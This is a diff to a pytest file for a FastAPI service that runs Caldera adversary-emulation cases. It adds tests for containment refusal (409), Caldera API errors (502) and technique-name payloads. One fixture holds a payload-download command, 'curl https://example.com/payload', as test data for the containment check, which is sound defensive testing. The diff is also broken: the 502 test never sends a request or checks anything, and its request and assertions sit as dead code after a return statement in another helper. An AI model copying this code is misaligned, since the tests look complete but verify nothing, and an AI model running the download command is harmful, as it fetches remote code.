@@ -42,7 +42,11 @@ import pytest
 from fastapi.testclient import TestClient
 from sqlalchemy.orm import Session, sessionmaker
 
-from app.api.emulacao import get_caldera_client, get_runner_factory
+from app.api.emulacao import (
+    _runner_abilities,
+    get_caldera_client,
+    get_runner_factory,
+)
 from app.core.config import Settings
 from app.db.base import Base, import_models
 from app.db.session import create_db_engine, get_db
@@ -100,6 +104,15 @@ def _healthy_router(request: httpx.Request) -> httpx.Response:
 def _timeout_router(request: httpx.Request) -> httpx.Response:
     """A MockTransport handler that always times out (Caldera silent, Req. 4.6)."""
     raise httpx.TimeoutException("simulated 10s timeout", request=request)
+
+
+def _caldera_error_router(request: httpx.Request) -> httpx.Response:
+    """Caldera is reachable but rejects the ability payload."""
+    if request.method.upper() == "GET" and request.url.path == HEALTH_PATH:
+        return httpx.Response(200, json={"status": "ok"})
+    if request.method.upper() == "POST" and request.url.path == ABILITIES_PATH:
+        return httpx.Response(500, json={"error": "invalid ability"})
+    raise AssertionError(f"unexpected request: {request.method} {request.url.path}")
 
 
 def _isolated_verifier(containers: list[str], _inspector: object) -> IsolationResult:
@@ -263,17 +276,25 @@ def test_emulacao_not_confirmed_runs_nothing(
 def test_emulacao_external_destination_returns_409(
     session_factory: sessionmaker[Session],
 ) -> None:
-    """A case with an external destination -> 409 identifying the violation (Req. 6.2).
-
-    ``shadowray`` (like the curated cases) contains commands reaching external
-    destinations (e.g. downloads), so its containment pre-flight refuses.
-    """
+    """A case with an external destination -> 409 identifying the violation."""
     client = _make_client(
         session_factory,
         transport=httpx.MockTransport(_healthy_router),
         isolation_verifier=_isolated_verifier,
     )
-    resp = client.post("/api/casos/shadowray/emulacao", json={"confirmado": True})
+    from app.api import emulacao as emulacao_module
+
+    original = emulacao_module._load_case_or_error
+    emulacao_module._load_case_or_error = (  # type: ignore[assignment]
+        lambda caso, case_service: _external_destination_case(caso)
+    )
+    try:
+        resp = client.post(
+            "/api/casos/shadowray/emulacao", json={"confirmado": True}
+        )
+    finally:
+        _restore_loader(original)
+
     assert resp.status_code == 409, resp.text
     detail = resp.json()["detail"]
     assert detail["motivo"] == "contencao_recusada"
@@ -303,6 +324,8 @@ def _internal_only_case(caso: str) -> object:
             AbilityData(
                 ability_id="a-internal",
                 name="internal only",
+                technique_name="Ingress Tool Transfer",
+                technique_id="T1105",
                 executors=[
                     Executor(
                         name="sh",
@@ -395,6 +418,72 @@ def test_emulacao_caldera_timeout_returns_503(
 
     assert resp.status_code == 503, resp.text
     assert "indisponível" in resp.json()["detail"].lower()
+
+
+def test_runner_payload_preserves_technique_name() -> None:
+    """The real Caldera schema requires technique_name in an Ability payload."""
+    case = _internal_only_case("shadowray")
+    abilities = _runner_abilities(case.abilities)  # type: ignore[attr-defined]
+
+    payload = OperationRunner._ability_payloads(abilities)[0]
+
+    assert payload["technique_name"] == "Ingress Tool Transfer"
+    assert payload["technique_id"] == "T1105"
+
+
+def test_emulacao_caldera_api_error_returns_502(
+    session_factory: sessionmaker[Session],
+) -> None:
+    """A reachable Caldera that rejects the request is an upstream 502."""
+    client, original = _client_with_internal_case(
+        session_factory,
+        transport=httpx.MockTransport(_caldera_error_router),
+        isolation_verifier=_isolated_verifier,
+    )
+
+
+def _external_destination_case(caso: str) -> object:
+    """A deterministic case that must be rejected by destination containment."""
+    from app.services.case_service import (
+        AbilityData,
+        AdversaryData,
+        CaseData,
+        Executor,
+    )
+
+    return CaseData(
+        id=caso,
+        nome=caso,
+        arquivo_ability="x",
+        arquivo_adversary="x",
+        arquivo_dag="x",
+        abilities=[
+            AbilityData(
+                ability_id="a-external",
+                name="external destination",
+                executors=[
+                    Executor(
+                        name="sh",
+                        platform="linux",
+                        command="curl https://example.com/payload",
+                    )
+                ],
+            )
+        ],
+        adversary=AdversaryData(id="adv-1", atomic_ordering=["a-external"]),
+    )
+    try:
+        resp = client.post(
+            "/api/casos/shadowray/emulacao", json={"confirmado": True}
+        )
+    finally:
+        _restore_loader(original)
+
+    assert resp.status_code == 502, resp.text
+    detail = resp.json()["detail"]
+    assert detail["motivo"] == "caldera_api_error"
+    assert detail["status_caldera"] == 500
+    assert detail["endpoint"] == ABILITIES_PATH
 
 
 def test_emulacao_happy_path_success_with_aggregate(
